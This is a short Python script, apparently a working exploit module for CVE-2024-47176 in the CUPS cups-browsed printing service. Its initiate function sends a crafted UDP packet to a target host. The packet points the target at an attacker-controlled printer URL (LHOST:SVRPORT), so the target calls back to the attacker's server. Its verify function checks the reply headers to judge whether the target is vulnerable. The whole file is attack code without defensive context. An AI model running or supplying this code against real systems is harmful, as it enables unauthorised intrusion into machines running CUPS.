import socket

def verify(data, printerName):
    headers = data.split('\n')
    print(f"[CVE_2024_47176] Evaluating Header:  {headers[0]}")
    print(f"[CVE_2024_47176] Target System Version:  {headers[4]}")

    if(printerName in headers[0]):
        print(f"[CVE_2024_47176] SYSTEM VULNERABLE!")
        return True
    else:
        print(f"[CVE_2024_47176] SYSTEM DOES NOT SEEM TO BE VULNERABLE")        
        return False


def initiate(RHOST, RPORT, LHOST, SVRPORT, printerName):

    payload = f"0 3 http://{LHOST}:{SVRPORT}/printers/{printerName}"
    print(f"[CVE_2024_47176] Prepping Payload:  '{payload}'")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    recipient_address = (RHOST, int(RPORT))

    message = payload
    data = message.encode('utf-8')

    sock.sendto(data, recipient_address)
    print("[CVE_2024_47176] Payload Sent")
    print("[CVE_2024_47176] Response Can Take A While. Go Get Some coffee")
    sock.close()
